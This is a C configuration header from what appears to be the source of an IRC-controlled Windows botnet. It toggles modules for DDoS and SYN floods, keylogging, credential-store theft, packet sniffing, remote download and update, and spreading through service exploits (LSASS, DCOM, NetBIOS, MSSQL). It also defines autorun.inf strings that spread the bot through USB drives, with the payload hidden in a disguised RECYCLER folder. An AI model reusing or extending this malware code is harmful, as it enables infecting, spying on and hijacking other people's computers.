
//#define NO_DDOS
//#define NO_SUPERSYN
#define NO_LOGOUT_CMD
//#define NO_REMOVE_CMD
//#define NO_UPDATE
#define NO_STOPVNC
//#define NO_AIM
#define NO_DDETECT
#define NO_ANTISANDBOX
#define NO_OPENSSL
#define NO_CONNCHECK
#define NO_SERVICE
#define NO_DLLTEST
#define NO_VERSION_REPLY
//#define NO_PING_REPLY
#define NO_CEL
#define NO_STATUS
#define NO_WINDOWCTRL
#define NO_DDETECT
//#define NO_PSTORE
//#define NO_SEED
#define NO_SECURE
#define NO_VIRUSREMOVE
#define NO_SFCDISABLE
#define NO_THCSQL
//#define NO_SOCKS4
#define NO_WINS
#define NO_NETDDE
#define NO_SVCHOST
#define NO_ADVSCAN
#define NO_ASN
#define NO_PNP
#define NO_WKSSVC
#define NO_VNC
#define NO_LSASS
#define NO_NETBIOS
#define NO_DCOM
#define NO_MSSQL
#define NO_EFTPD
#define NO_RECORD_UPTIME
#define NO_SYSINFO
#define NO_DRIVEINFO
#define NO_VSCAN
//#define NO_DOWNLOAD
#define NO_CRYPT
#define NO_REDIRECT
#define NO_SOCK4SERV
#define NO_SPEEDTEST
#define NO_RDRIV
#define NO_FU
#define NO_REGCTRL
#define NO_FLUSHDNS
#define NO_FLUSHARP
#define NO_KEYLOG
#define NO_PROCESS
#define NO_LSARESTRICT
#define NO_SYSINFO
#define NO_DRIVEINFO
#define NO_NETINFO
#define NO_CHECKHOST
#define NO_NETSTATP
#define NO_CAPTURE
#define NO_MIRCCMD
#define NO_SPY_WARNING
#define NO_PING
#define NO_MELT
#define NO_FCONNECT
#define NO_RECORD_UPTIME
#define NO_INSTALLED_TIME
#define NO_AUTO_SECURE
#define NO_SNIFFER
#define NO_MIRCINFO
#ifdef _DEBUG
//#define NO_SERVICE
#define NO_MELT
#define NO_FU
#endif
#ifdef NO_ADVSCAN
#define NO_EFTPD
#define NO_LSASS
#define NO_NETBIOS
#define NO_DCOM
#define NO_WKSSVC
#define NO_MSSQL
#define NO_THCSQL
#define NO_WINS
#define NO_SVCHOST
#define NO_NETDDE
#endif

#define USBSLEEPTIME		12000
#define USB_STR_RECYCLER	"\\RECYCLER"
#define USB_STR_REC_SUBDIR	"\\S-1-6-21-2434476501-1644491937-600003330-1213"
#define USB_STR_DESKTOP_DATA	"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define USB_STR_DESKTOP_INI	"\\Desktop.ini"
#define USB_STR_AUTORUN_INF	"\\autorun.inf"
#define USB_STR_AUTORUN_DATA1	"[autorun]\r\nopen="
#define USB_STR_AUTORUN_DATA2	"\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command="
#define USB_STR_AUTORUN_DATA3	"\r\nshell\\open\\default=1"

#define BK_THREAD 2

#define PING_TIMEOUT	200
#define IRCLINE		514
#define MAX_TOKENS	64
#define MAX_LOGINS	3
#define MAX_THREADS	512
#define MAX_IP		16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN	18
#define REQ_NICKLEN	7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22
#define MAX_SCANDELAY	60
#define MIN_SCANDELAY	3
#define MAX_SCANTHRD	256
#define MAX_SCANTIME	9999
#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383
#define NICK_TYPE	N_MINE
#define IDENT_TYPE	N_OS
#define REALN_TYPE	N_BOX
#define FLOOD_DELAY	2000
#define SFLOOD_DELAY	7000
#define RUPTIME_DELAY	600000
#define SECURE_DELAY	600000
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#ifndef SIO_RCVALL
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#endif
